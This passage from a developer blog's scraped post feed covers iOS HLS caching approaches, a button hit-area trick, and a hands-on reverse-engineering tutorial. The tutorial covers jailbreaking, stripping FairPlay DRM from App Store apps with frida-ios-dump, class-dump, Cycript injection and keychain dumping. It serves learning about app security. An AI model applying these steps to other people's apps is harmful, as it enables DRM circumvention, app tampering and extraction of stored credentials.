URL(string:\"streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https\")var player: AVPlayer = AVPlayer(url: url)player.play()URLProtocol 會攔截到 streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https ，這時我們只要幫他還原成原來的網址，然後發個 URLSession 去要資料就能在這邊自己做 Cache；m3u8 中的 .ts 檔案請求一樣也會被 URLProtocol 攔截到，一樣我們能在這自己做 Cache。一切看似都那麼完美，但當我興高采烈的 Build-Run 完 APP 後，蘋果直接搧了我一巴掌：Error: 12881 “CoreMediaErrorDomain custom url not redirect”他不吃我給 .ts 檔案 Request 的 Response Data，我只能用 urlProtocol:wasRedirectedTo 這個方法 redirectTo 原始 Https 請求才能正常播放，即使我把 .ts 檔案下載到本地然後 redirectTo 那個 file:// 檔案；他也不接受，查 官方論壇 得到答案就是不能這樣做； .m3u8 只能是來源於 Http/Https (所以即使你把整個 .m3u8 還有所有分割檔 .ts 都放在本地，有無法使用 file:// 給 AVPlayer播放)，另外 .ts 也不能使用 URLProtocol 自行給予 Data。fxxk…方案 2.2–2 同方案 2.2 但是搭配 方案 1 AVAssetResourceLoaderDelegate 來實現 ❌實作方式如方案 2.2 ，餵給 AVPlayer 自訂的 Scheme 讓他進 AVAssetResourceLoaderDelegate；然後我們在自己處理。同 2.2 結果：Error: 12881 “CoreMediaErrorDomain custom url not redirect”官方論壇 同樣的回答。可以拿來做解密處理(可以參考 此篇文章 或 此範例 )但還是無法實現 Cache 功能。方案 3. Reverse Proxy Server ⍻ (可行，但非完美)這個方法是在找如何處理 HLS Cache 時，最多人給的答案；就是在 APP 上起一個 HTTP Server 做 Reverse Proxy Server 服務。原理也很簡單，APP 上 On 一個 HTTP Server 假設是 8080 Port，網址就會是 http://127.0.0.1:8080/ ；然後我們可以對連進來的 Request 做處理，給出 Response。套用到我們的案例就是，把請求網址換成： http://127.0.0.1:8080/aviciiwakemeup.m3u8?origin=http://zhgchg.li/在 HTTP Server 的 Handler 上對 *.m3u8 攔截處理，這時有 Request 進來就會進到我們的 Handler 中，看我們想幹嘛就幹嘛，想 Response 什麼 Data 都是我們自己控制， .ts 檔同樣會進來；這邊就可以做我們想做的 Cache 機制。對 AVPlayer 來說就是個 http://.m3u8 的標準串流音訊檔，所以不會有任何問題。完整實作範例可參考：因為我也是參考此範例做的，所以 Local HTTP Server 的部分我也是使用 GCDWebServer ，另外還有更新的 Telegraph 可以使用。( CocoaHttpServer 太久沒更新就不推薦用了)看起來不錯！但有個問題：我們的服務是音樂串流而非影音播放平台，音樂串流很多時候使用者都是在背景執行音樂切換的；這時候 Local HTTP Server 還會在？？GCDWebServer 的說明是當進入背景時會自動斷線、回前景自動恢復，但可以透過設置參數 GCDWebServerOption_AutomaticallySuspendInBackground:false 不讓他有這個機制。但是實測如果一段時間沒有發送請求 Server 還是會斷線 (且狀態會是錯的，還是 isRunning) 感覺就是被系統砍了；深掘了 HTTP Server 的做法 後發現底層都是基於 socket，查了 官方對 socket 服務的文件 後，此缺陷是無法解決的，本來在背景下沒有新的連接時就會被系統暫停。*網路上有找到很繞的方法…就是發個長請求、或不斷發空的請求確保 Server 在背景不會被系統暫停掉。以上都是針對 APP 在背景的狀況，在前景時 Server 很穩，也不會因為閒置被暫停，沒這問題！是說畢竟是依賴在其他服務上，開發環境測試沒問題，實際應用也建議要接個 rollback 處理(AVPlayer.AVPlayerItemFailedToPlayToEndTimeErrorKey 通知)；否則有個萬一服務掛掉，使用者會卡死。所以說不完美啊…方案 4. 使用 HTTP Client 本身的 caching 機制 ❌我們的 .m3u8/.ts 檔的 Response Headers 都有給予 Cache-Control 、 Age 、 eTag … 這些 HTTP Client Cache 資訊；我們的網站 Cache 機制在 Chrome 上使用也完全沒問題，另外也在官方新的針對 Protocol Extension for Low-Latency HLS (低延遲HLS) 初步規格文件中提到 Cache 的地方也看到可以設定 cache-control headers 來做緩存。但實際 AVFoundation AVPlayer 並沒有任何 HTTP Client Caching 效果，此路也不通！單純癡人說夢。方案 5. 不使用 AVFoundation AVPlayer 播放音訊檔 ✔自己實現音訊檔解析、緩存、編碼、播放功能。太硬核了，需要很深的技術能力及大量時間；沒研究。附上一個網路開源播放器做參考： FreeStreamer ，真要選擇此方案不如站在巨人的肩膀上，直接用第三方套件了。方案 5–1. 不使用 HLS同方案 5 ， 太硬核了，需要很深的技術能力及大量時間；沒研究。方案 6. 將 .ts 分割檔轉成 .mp3/.mp4 檔案 ✔沒研究，但的確可行；不過想起來就覺得複雜，要處理已下載的 .ts 檔案，個別轉成 .mp3 或 .mp4 檔案然後照順序播放、或是壓縮成一個檔案什麼的，想起來就不太好做。有興趣可參考 此篇文章 。方案 7. 下載完整檔案後再播放 ⍻這個方法不能確切叫邊播邊 Cache，實際是載下整個音訊檔案的內容，然後才開始播放；如果是 .m3u8 如同方案 2.2 提到的，不能直接載下來放在本地播放。要實作的話要用到 iOS ≥ 10 的 API AVAssetDownloadTask.makeAssetDownloadTask ，實際會將 . m3u8 打包成 .movpkg 放在本地，供使用者播放。這邊比較像是做離線播放而非做 Cache 的功能。另外使用者也能從「設定」-&gt;「一般」-&gt;「iPhone 儲存空間」-&gt; APP 中查看、管理已下載打包的音訊檔案。下方 已下載的影片 部分詳細實作可參考此範例：結語以上的探索路程大概花了快一整週，繞來繞去、快要喪心病狂了；目前還沒有一個可靠的、容易部署的方法。如果有新的想法再來更新!參考資料 iOS音频播放 (九)：边播边缓存 StyleShare/HLSCachingReverseProxyServer有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 5,110 Total Views Last Statistics Date: 2025-08-15 | 4,967 Views on Medium." }, { "title": "Exploring iOS HLS Cache Implementation Methods", "url": "/posts/zrealm-dev/en/exploring-ios-hls-cache-implementation-methods-d796bf8e661e/", "categories": "ZRealm Dev.", "tags": "hls, ios, ios-app-development, cache, reverse-proxy", "date": "2020-04-09 01:12:17 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring iOS HLS Cache Implementation MethodsHow to achieve caching functionality w...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring iOS HLS Cache Implementation MethodsHow to achieve caching functionality while playing m3u8 streaming media files using AVPlayerphoto by Mihis Alex[2023/03/12] Update The next article, “AVPlayer Complete Guide to Implementing Local Cache Functionality,” will teach you how to implement AVPlayer caching.I have open-sourced my previous implementation, so friends in need can use it directly. Customizable cache strategies, can use PINCache or others… Externally, just call the make AVAsset factory with the URL, and the AVAsset will support caching. Implemented data flow strategies using Combine. Wrote some tests.AboutHTTP Live Streaming (HLS) is a streaming media network transport protocol based on HTTP proposed by Apple.For music playback, in non-streaming situations, we use mp3 as the music file, and the time it takes to download the entire file depends on its size; HLS splits a file into multiple smaller files, allowing playback to start as soon as the first segment is received, without needing to download the entire file first!The .m3u8 file records the bitrate, playback order, duration, and overall audio information of these segmented .ts files. It can also provide encryption protection, low-latency live streaming, etc.Example of a .m3u8 file (aviciiwakemeup.m3u8):#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-TARGETDURATION:10#EXT-X-MEDIA-SEQUENCE:0#EXTINF:9.900411,aviciiwakemeup–00001.ts#EXTINF:9.900400,aviciiwakemeup–00002.ts#EXTINF:9.900411,aviciiwakemeup–00003.ts#EXTINF:9.900411,...#EXTINF:6.269389,aviciiwakemeup-00028.ts#EXT-X-ENDLIST*EXT-X-ALLOW-CACHE has been deprecated in iOS≥ 8/Protocol Ver.7 and is no longer meaningful whether this line is present or not.GoalFor a streaming media service, caching is extremely important; because each audio file can range from MB to several GB, if every replay requires fetching the file from the server again, it puts a heavy load on the server, and data costs are significant. Having a caching layer can save a lot of money for the service and prevent users from wasting bandwidth and time re-downloading; it’s a win-win mechanism (but remember to set limits/timely clean-up to avoid overwhelming users’ devices).IssuesIn the past, with non-streaming mp3/mp4 files, there wasn’t much to handle; you would just download the file to the device before playback, starting playback only after the download was complete. Regardless, you had to download the entire file before playback, so why not just use URLSession to download the file and then feed the local file path to AVPlayer for playback? Alternatively, you could use the proper method of implementing caching through AVAssetResourceLoaderDelegate in the delegate methods.When it comes to streaming, the idea is straightforward: read the .m3u8 file, parse the information inside, and cache each .ts file. However, I found that the implementation was not as simple as I expected, and the complexity exceeded my imagination, which is why this article exists!For playback, we still use AVPlayer from iOS AVFoundation directly, as there is no difference in handling streaming and non-streaming files.Example:let url:URL = URL(string:\"https://zhgchg.li/aviciiwakemeup.m3u8\")var player: AVPlayer = AVPlayer(url: url)player.play()2021–01–05 Update:We have reverted to using mp3 files, which allows us to directly implement using AVAssetResourceLoaderDelegate. For detailed implementation, refer to “AVPlayer Caching in Action.”Implementation SolutionsSeveral solutions we can achieve for our goal and the issues encountered during implementation.Solution 1. AVAssetResourceLoaderDelegate ❌The first idea was to do it the same way as with mp3/mp4! Use AVAssetResourceLoaderDelegate to cache the .ts files in the delegate methods.However, I’m sorry, this approach doesn’t work because we cannot intercept the download request information for the .ts files in the delegate. You can find this confirmed in this Q&amp;A and the official documentation.For implementation of AVAssetResourceLoaderDelegate, refer to “AVPlayer Caching in Action.”Solution 2.1 URLProtocol Intercept Requests ❌URLProtocol is a method I recently learned, which allows us to intercept all requests based on the URL Loading System (URLSession, API calls, image downloads, etc.) to modify requests and responses and return them as if nothing happened, stealthily. For more about URLProtocol, refer to this article.Applying this method, we intended to intercept AVFoundation AVPlayer’s requests for .m3u8 and .ts files, returning cached data if available locally; otherwise, we would send a real request. This would also achieve our goal.Again, I’m sorry, this approach doesn’t work either; AVFoundation AVPlayer’s requests are not part of the URL Loading System, so we cannot intercept them.*There is a claim that it works on the simulator but not on actual devices.Solution 2.2 Force it into URLProtocol ❌Based on Solution 2.1, a brute-force method is to change the request URL to a custom scheme (e.g., streetVoiceCache://). Since AVFoundation cannot handle this request, it will throw it out, allowing our URLProtocol to intercept it and perform our desired actions.let url:URL = URL(string:\"streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https\")var player: AVPlayer = AVPlayer(url: url)player.play()URLProtocol will intercept streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https, and we just need to revert it to the original URL, then send a URLSession request to fetch the data and perform caching ourselves; the requests for .ts files in the m3u8 will also be intercepted by URLProtocol, allowing us to cache them as well.Everything seemed perfect, but when I excitedly built and ran the app, Apple slapped me with:Error: 12881 “CoreMediaErrorDomain custom url not redirect”It doesn’t accept the response data I provide for the .ts file requests; I can only use the urlProtocol:wasRedirectedTo method to redirect to the original HTTPS request for it to play normally. Even if I download the .ts files locally and redirect to that file:// file, it still doesn’t accept it. According to the official forum, the answer is that this cannot be done; .m3u8 must originate from HTTP/HTTPS (so even if you place the entire .m3u8 and all the segmented .ts files locally, you cannot use file:// to play them with AVPlayer), and .ts files cannot be provided with data via URLProtocol.fxxk…Solution 2.2–2 Same as Solution 2.2 but with AVAssetResourceLoaderDelegate ❌The implementation is similar to Solution 2.2, feeding AVPlayer a custom scheme to enter AVAssetResourceLoaderDelegate; then we handle it ourselves.Same result as 2.2:Error: 12881 “CoreMediaErrorDomain custom url not redirect”The official forum provides the same answer.This can be used for decryption processing (refer to this article or this example), but it still cannot achieve caching functionality.Solution 3. Reverse Proxy Server ⍻ (Feasible but not perfect)This method is the most commonly suggested solution when looking for how to handle HLS caching; it involves setting up an HTTP server in the app to serve as a reverse proxy server.The principle is simple: run an HTTP server on the app, say on port 8080, so the URL becomes http://127.0.0.1:8080/; then we can handle incoming requests and provide responses.Applied to our case, we change the request URL to: http://127.0.0.1:8080/aviciiwakemeup.m3u8?origin=http://zhgchg.li/In the HTTP server’s handler, we intercept *.m3u8 requests; when a request comes in, it enters our handler, and we can do whatever we want, controlling what data to respond with. The .ts files will also come in; here we can implement our desired caching mechanism.To AVPlayer, it appears as a standard streaming audio file at http://*.m3u8, so there won’t be any issues.For a complete implementation example, refer to:Since I also referred to this example, I used GCDWebServer for the local HTTP server part, and there’s also the newer Telegraph available. ( CocoaHttpServer is not recommended due to lack of updates)It looks good! But there’s a problem:Our service is a music streaming service rather than a video playback platform, and many times users are switching music while the app is running in the background; will the local HTTP server still be active then?GCDWebServer’s documentation states that it will automatically disconnect when entering the background and reconnect when returning to the foreground, but you can set the parameter GCDWebServerOption_AutomaticallySuspendInBackground:false to prevent this mechanism.However, in practice, if there are no requests sent for a while, the server will still disconnect (and the status will be incorrect, still showing as isRunning); it feels like the system has killed it; after digging into the HTTP server approach, I found that the underlying implementation is based on sockets, and according to the official documentation on socket services, this limitation cannot be resolved; the system will suspend it when there are no new connections in the background.*I found a convoluted method online… just send a long request or continuously send empty requests to ensure the server doesn’t get suspended by the system in the background.All of the above pertains to the app’s background state; when in the foreground, the server is stable and won’t be suspended due to idleness, so there’s no issue!That said, since it relies on other services, while testing in the development environment is fine, it’s also advisable to implement a rollback handling (AVPlayer.AVPlayerItemFailedToPlayToEndTimeErrorKey notification); otherwise, if the service goes down, users will be stuck.So it's not perfect...Solution 4. Use the HTTP Client’s own caching mechanism ❌Our .m3u8/.ts file response headers provide Cache-Control, Age, eTag, and other HTTP client cache information; our website’s caching mechanism works perfectly in Chrome, and I also saw mentions of cache-control headers for caching in the official new specification document for Protocol Extension for Low-Latency HLS.However, in practice, AVFoundation AVPlayer does not exhibit any HTTP client caching effects, so this approach doesn’t work! It’s just wishful thinking.Solution 5. Do not use AVFoundation AVPlayer to play audio files ✔Implement your own audio file parsing, caching, encoding, and playback functionality.This is too hardcore, requiring deep technical skills and a lot of time; I haven’t researched it.Here’s an open-source player for reference: FreeStreamer, and if you choose this solution, it would be better to stand on the shoulders of giants and use a third-party library directly.Solution 5–1. Do not use HLSSame as Solution 5, this is too hardcore, requiring deep technical skills and a lot of time; I haven’t researched it.Solution 6. Convert .ts segmented files to .mp3/.mp4 files ✔I haven’t researched this, but it is indeed feasible; however, it seems complicated to handle the downloaded .ts files, converting each to .mp3 or .mp4 files and playing them in order, or compressing them into a single file, which sounds challenging.For those interested, refer to this article.Solution 7. Download the complete file before playback ⍻This method cannot be accurately called caching while playing; it actually downloads the entire audio file content before starting playback. If it’s .m3u8, as mentioned in Solution 2.2, it cannot be directly downloaded and played locally.To implement this, you would need to use the iOS ≥ 10 API AVAssetDownloadTask.makeAssetDownloadTask, which will package the .m3u8 into a .movpkg file stored locally for user playback.This is more akin to offline playback rather than caching functionality.Additionally, users can view and manage downloaded audio files from the \"Settings\" -&gt; \"General\" -&gt; \"iPhone Storage\" -&gt; APP.![Downloaded Videos Section Below](/assets/d796bf8e661e/1*_YNIdy8NRkhVdeDTNvXzxA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NzUiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Downloaded Videos Section Below**For detailed implementation, please refer to this example:**[![](https://opengraph.githubassets.com/a2ceae202336428494e5cd51b78cfbba3d139c135eaf232b4d2dffd2a7673eba/zhonglaoban/HLS-Stream)](https://github.com/zhonglaoban/HLS-Stream){:target=\"_blank\"}### ConclusionThe exploration process took almost a whole week, going around in circles and nearly driving me crazy; currently, there is no reliable and easy-to-deploy method.I will update if I have new ideas!#### References- [iOS Audio Playback (Nine): Streaming and Caching](http://msching.github.io/blog/2016/05/24/audio-in-ios-9/){:target=\"_blank\"}- [StyleShare/HLSCachingReverseProxyServer](https://github.com/StyleShare/HLSCachingReverseProxyServer){:target=\"_blank\"}If you have any questions or suggestions, feel free to [contact me](https://www.zhgchg.li/contact){:target=\"_blank\"}.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 5,110 Total Views Last Statistics Date: 2025-08-15 | 4,967 Views on Medium." }, { "title": "iOS 逆向工程初體驗", "url": "/posts/zrealm-dev/ios-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%9D%E9%AB%94%E9%A9%97-7498e1ff93ce/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, hacking, jailbreak, security", "date": "2020-03-28 18:24:40 +0800", "snippet": "iOS 逆向工程初體驗從越獄、提取iPA檔敲殼到UI分析注入及反編譯的探索過程關於安全之前唯一做過跟安全有關的就只有 &lt;&lt; 使用中間人攻擊嗅探傳輸資料 &gt;&gt; ；另外也接續這篇，假設我們在資料傳輸前編碼加密、接受時 APP 內解密，用以防止中間人嗅探；那還有可能被偷走資料嗎？ 答案是肯定的！，就算沒真的試驗過；世界上沒有破不了的系統，只有時間成本的問題，當破解耗費的時...", "content": "iOS 逆向工程初體驗從越獄、提取iPA檔敲殼到UI分析注入及反編譯的探索過程關於安全之前唯一做過跟安全有關的就只有 &lt;&lt; 使用中間人攻擊嗅探傳輸資料 &gt;&gt; ；另外也接續這篇，假設我們在資料傳輸前編碼加密、接受時 APP 內解密，用以防止中間人嗅探；那還有可能被偷走資料嗎？ 答案是肯定的！，就算沒真的試驗過；世界上沒有破不了的系統，只有時間成本的問題，當破解耗費的時間精力大於破解成果，那就可以稱為是安全的！How?都做到這樣了，那還能怎麼破？就是本篇想記錄的議題 — 「逆向工程 」 ，敲開你的 APP 研究你是怎麼做加解密的；其實一直以來對這個領域都是懵懵懂懂，只在 iPlayground 2019 上聽過兩堂大大的分享，大概知道原理還有怎麼實現，最近剛好有機會玩了一下跟大家分享！逆了向，能幹嘛？ 查看 APP UI 排版方式、結構 獲取 APP 資源目錄 .assets/.plist/icon… 竄改 APP 功能重新打包 (EX: 去廣告) 反編譯推測原始程式碼內容取得商業邏輯資訊 dump 出 .h 標頭檔 / keycahin 內容實現環境macOS 版本： 10.15.3 CatalinaiOS 版本： iPhone 6 (iOS 12.4.4 / 已越獄) *必要 Cydia: Open SSH越獄的部分任何版本的 iOS、iPhone 都可以，只要是能越獄的設備，建議使用舊的手機或是開發機，以避免不必要的風險；可根據自己的手機、iOS 版本參考 瘋先生越獄教學 ，必要時需要將 iOS 降版 （ 認證狀態查詢 ）再越獄。我是拿之前的舊手機 iPhone 6 來測試，原本已經升到 iOS 12.4.5 了，但發現 12.4.5 一直越獄不成功，所幸先降回 12.4.4 然後使用 checkra1n 越獄就成功了！步驟不多，也不難；只是需要時間等待！附上一個自己犯蠢的經驗： 下載完舊版 IPSW 檔案後，手機接上 Mac ，直接使用 Finder 檔案瀏覽器(macOS 10.5 後就沒有 iTunes 了)，在左方 Locations 選擇手機，出現手機資訊畫面後， 「Option」按著然後再點「Restore iPhone」 就能跳出 IPSW 檔案選擇視窗，選擇剛下載下來的舊版 IPSW 檔案就能完成刷機降版。 我本來傻傻的直接按 Restore iPhone…只會浪費時間重刷一次最新版而已….使用 lookin 工具查看別人的 APP UI 排版我們先來點有趣的前菜，使用工具搭配越獄手機查看別人APP 是怎麼排版。查看工具： 一是 老牌 Reveal (功能更完整，需付費約 $60 美金/可試用)，二是騰訊 QMUI Team 製作的 lookin 免費開源工具；這邊使用 lookin 作為示範，Reveal 大同小異。 若沒有越獄手機也沒關係，此工具主要是讓你用在開發中的專案上，查看 Debug 排版（取代 Xcode 陽春的 inspector） 平常開發也能用到 ！ 唯有要看別人的 APP 需要使用越獄手機。如果要看自己的專案…可以選擇使用 CocoaPods 安裝、 斷點插入 （僅支援模擬器）、 手動導入Framework 到專案 、 手動設置 ，四種方法。將專案 Build + Run 起來之後，就能 在 Lookin 工具上選擇 APP 畫面 -&gt; 查看排版結構 。如果要看別人的APP…Step 1. 在越獄手機上打開「 Cydia 」-&gt; 搜尋「 LookinLoader 」-&gt;「 安裝 」-&gt; 回到手機「 設定 」-&gt;「 Lookin 」-&gt;「 Enabled Applications 」-&gt; 啟用想要查看的 APP 。Step 2. 使用傳輸線 將手機連接至 Mac 電腦 -&gt; 打開想要查看的APP -&gt; 回到電腦， 在 Lookin 工具上選擇 APP 畫面 -&gt; 即可 查看排版結構 。Lookin 查看排版結構Facebook 登入畫面排版結構可在左側欄檢視 View Hierarchy、右側欄對選中的物件進行動態修改。原本的「建立新帳號」被我改成「哈哈哈」對物件的修改也會實時的顯示在手機 APP 上，如上圖。就如同網頁的「F12」開發者工具，所有的修改僅對 View 有效，不會影響實際的資料；主要是拿來 Debug ，當然也可以用來改值、截圖，然後騙朋友 ＸＤ使用 Reveal 工具查看 APP UI 排版結構雖然 Reveal 需要付費才能使用，但個人還是比較喜歡 Reveal；在結構顯示上資訊更詳細、右方資訊欄位幾乎等同於 XCode 開發環境，想做什麼即時調整都可以，另外也會提示 Constraint Error 對於 UI 排版修正非常有幫助！這兩個工具在日常開發自己的 APP 上都非常有幫助！ 了解完流程環境及有趣的部分之後，就讓我們進入正題吧！ *以下開始都需要越獄手機配合提取 APP .ipa 檔案 &amp; 砸殼所有從 App Store 安裝的 APP，其中的 .ipa 檔案都有 FairPlay DRM 保護 ，俗稱加殼保護/相反的去掉保護就叫「砸殼」，所以單純從 App Stroe 提取 .ipa 是沒有意義的，也用不了。*另一個工具 APP Configurator 2 只能提取有保護的檔案，沒意義就不再贅述，有興趣使用此工具的朋友可以 點此 查看教學。使用工具+越獄手機提取砸殼之後的原始 .ipa 檔案：關於工具部分起初我使用的是 Clutch ，但怎麼嘗試都出現 FAILED 查了下專案 issue，發現有很多人有同樣狀況，貌似此工具已經不能在 iOS ≥ 12 使用了、另外還有一個老牌工具 dumpdecrypted ，但我沒有研究。這邊使用 frida-ios-dump 這個 Python 工具進行動態砸殼，使用起來非常方便！首先我們先準備 Mac 上的環境： Mac 本身自帶 Python 2.7 版本，此工具支援 Python 2.X/3.X，所以不用在特別安裝 Python；但我是使用 Python 3.X 進行操作的，如果有遇到 Python 2.X 的問題，不妨嘗試 安裝使用 Python 3 吧！ 安裝 pip （ Python 的套件源管理器） 使用 pip 安裝 frida ：sudo pip install frida -upgrade -ignore-installed six (python 2.X)sudo pip3 install frida -upgrade -ignore-installed six (python 3.X) 在 Terminal 輸入 frida-ps 如果沒錯誤訊息代表安裝成功！ Clone AloneMonkey/frida-ios-dump 這個專案 進入專案，用文字編輯器打開 dump.py 檔案 確認 SSH 連線設定部分是否正確 (預設不用特別動)User = ‘root’Password = ‘alpine’Host = ‘localhost’Port = 2222越獄手機上的環境： 安裝 Open SSH ：Cydia → 搜尋 → Open SSH →安裝 安裝 Frida 源：Cydia → 來源 → 右上角「編輯」 → 左上角「加入」 → https://build.frida.re 安裝 Frida：Cydia → 搜尋 → Frida → 依照手機處理器版本安裝對應的工具（EX: 我是 iPhone 6 A11，所以是裝 Frida for pre-A12 devices 這個工具）環境都弄好之後，開工：1.將手機使用 USB 連接到電腦2.在 Mac 上打開一個 Terminal 輸入 iproxy 2222 22 ，啟動 Server。3.確保手機/電腦處於相同網路環境中(EX: 連同個WiFi)4.再打開一個 Terminal 輸入 ssh root@127.0.0.1，輸入 SSH 密碼(預設是 alpine )5.再打開一個 Terminal 進行敲殼命令操作，cd 到 clone 下來的 /frida-ios-dump 目錄下。輸入 dump.py -l 列出手機中已安裝/正在執行的 APP。6. 找到要敲殼導出的 APP 名稱 / Bundle ID，輸入：dump.py APP名稱或BundleID -o 輸出結果的路徑/輸出檔名.ipa這邊務必指定 輸出結果的路徑/檔名 ，因為預設輸出路徑會在 /opt/dump/frida-ios-dump/ 這邊不想把它搬到 /opt/dump 中，所以要指定輸出路徑避免權限錯誤。7. 輸出成功後就能取得已敲殼的 .ipa 檔案！ 手機必須在解鎖情況下才能使用工具 若出現連線錯誤、reset by peer…等原因，可嘗試拔掉重插 USB 連接、重開 iproxy。7.將 .ipa 檔直接重新命名成 .zip 檔，然後直接右鍵解壓縮檔會出現 /Payload/APP名稱.app有了原始 APP 檔後我們可以…1. 提取 APP 的資源目錄在 APP名稱.app 右鍵 → 「Show Package Contents」就能看到 APP 的資源目錄2. class-dump 出 APP .h頭文件訊息使用 class-dump 工具導出全 APP (包含 Framework) .h 頭文件訊息 (僅限 Objective-C，若專案為 Swift 則無效)nygard/class-dump 大大的工具我嘗試失敗，一直 failed；最後還是一樣使用 AloneMonkey / MonkeyDev 大大的工具集中改寫過的 class-dump 工具才成功。 直接從這裡 Download MonkeyDev/bin/class-dump 工具 打開 Terminal 直接使用：./class-dump -H APP路徑/APP名稱.app -o 匯出的目標路徑dump 成功之後就能獲取到整個 APP 的 .h 資訊。4. 最後也是最困難的 — 進行反編譯可以使用 IDA 和 Hopper 反編譯工具進行分析使用，兩款都是收費工具， Hopper 可免費試用(每次 30 分鐘)我們將取得的 APP名稱.app 檔案直接拉到 Hopper 即可開始進行分析。不過我也就止步於此了，因為從這開始就要研究機器碼、搭配 class-dump 結果推測方法…等等；需要非常深入的功力才行！突破反編譯後，可以自行竄改運作重新打包成新的 APP。圖片取自航海王逆向工程的其他工具1. 使用 MITM Proxy 免費工具嗅探 API 網路請求資訊 &gt;&gt;APP有用HTTPS傳輸，但資料還是被偷了。2.Cycript (搭配越獄手機) 動態分析/注入工具： 在越獄手機上打開「Cydia」-&gt; 搜尋「Cycript」-&gt;「安裝」 在電腦打開一個 Terminal 使用 Open SSH 連線至手機， ssh root@手機IP (預設是 alpine ) 打開目標 APP (APP 保持在前景) 在 Terminal 輸入 ps -e | grep APP Bundle ID 查找正在運行的 APP Process ID 使用 cycript -p Process ID 注入工具到正在運行的 APP可使用 Objective-c/Javascript 進行調試控制。For Example:cy# alert = [[UIAlertView alloc] initWithTitle:@\"HIHI\" message:@\"ZhgChg.li\" delegate:nil cancelButtonTitle:@\"Cancel\" otherButtonTitles:nl]cy# [alert show]注入一個 UIAlertViewController… chose( ) : 獲取目標 UIApp.keyWindow.recursiveDescription( ) .toString( ) : 顯示 view hierarchy 結構資訊 new Instance(記憶體位置): 獲取物件 exit(0) : 結束詳細操作可參考 此篇文章 。3. Lookin / Reveal 查看 UI 排版工具前面介紹過，再推一次；在自己的專案日常開發上也非常好用，建議購買使用 Reveal。4. MonkeyDev 集成工具 ，可透過動態注入竄改 APP 並重新打包成新的 APP5. ptoomey3 / Keychain-Dumper ，導出 KeyChain 內容詳細操作請參考 此篇文章 ，不過我沒試成功，看專案 issue 貌似也是在 iOS ≥ 12 之後就失效了。總結這個領域是個超級大坑，需要非常多的技術知識基礎才有可能精通；本篇文章只是粗淺了「體驗」了一下逆向工程是什麼感覺，如有不足敬請見諒！ 僅供學術研究，勿做壞壞的事 ；個人覺得整個流程工具玩下來蠻有趣的，也對 APP 安全更有點概念！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 9,971 Total Views Last Statistics Date: 2025-08-15 | 9,752 Views on Medium." }, { "title": "iOS 擴大按鈕點擊範圍", "url": "/posts/zrealm-dev/ios-%E6%93%B4%E5%A4%A7%E6%8C%89%E9%88%95%E9%BB%9E%E6%93%8A%E7%AF%84%E5%9C%8D-a8c2d7ed144b/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, 顧小事成大事, uikit, ios", "date": "2020-02-01 21:45:49 +0800", "snippet": "iOS 擴大按鈕點擊範圍重寫 pointInside 擴大感應區域日常開發上經常遇到版面照著設計 UI 排好之後，畫面美美的，但是實際操作上按鈕的感應範圍太小，不容易準確點擊；尤其對手指粗的人極不友善。完成範例圖Before…關於這個問題當初沒特別深入研究，直接暴力蓋一個範圍更大的透明 UIButton 在原按鈕上，並使用這個透明的按鈕響應事件，做起來非常麻煩、元件一多也不好控制。後來改用排...", "content": "iOS 擴大按鈕點擊範圍重寫 pointInside 擴大感應區域日常開發上經常遇到版面照著設計 UI 排好之後，畫面美美的，但是實際操作上按鈕的感應範圍太小，不容易準確點擊；尤其對手指粗的人極不友善。完成範例圖Before…關於這個問題當初沒特別深入研究，直接暴力蓋一個範圍更大的透明 UIButton 在原按鈕上，並使用這個透明的按鈕響應事件，做起來非常麻煩、元件一多也不好控制。後來改用排版的方式解決，按鈕在排版時設定上下左右都對齊0 (或更低)，再控制 imageEdgeInsets 、 titleEdgeInsets 、 contentEdgeInsets 這三個內距參數，將 Icon/按鈕標題 推到 UI 設計的正確位置；但這個做法比較適合使用 Storyboard/xib 的專案，因為可以直接在 Interface Builder 去推排版；另外一個是設計出的 Icon 最好要是沒有劉間距的，不然會不好對位置，有時候可能就卡在那個 0.5 的距離，怎麼調都不對齊。After…正所謂見多識廣，最近接觸到新專案之後又學到了一小招；就是可以在 UIButton 的 pointInside 中加大事件響應範圍，預設是 UIButton 的 Bounds，我們可以在裡面延伸 Bounds 的大小使按鈕的可點擊區域更大！經過以上思路…我們可以：class MyButton: UIButton { var touchEdgeInsets:UIEdgeInsets? override open func point(inside point: CGPoint, with event: UIEvent?) -&gt; Bool { var frame = self.bounds if let touchEdgeInsets = self.touchEdgeInsets { frame = frame.inset(by: touchEdgeInsets) } return frame.contains(point); }}自訂一個 UIButton ，增加 touchEdgeInsets 這個 public property 存放要擴張的範圍 方便我們使用；接著複寫 pointInside 方法，實作上述的想法。使用：import UIKitclass MusicViewController: UIViewController { @IBOutlet weak var playerButton: MyButton! override func viewDidLoad() { super.viewDidLoad() playerButton.touchEdgeInsets = UIEdgeInsets(top: -10, left: -10, bottom: -10, right: -10) } }播放按鈕/藍色為原始點擊區域/紅色為擴大後的點擊範圍使用時只需記得要將 Button 的 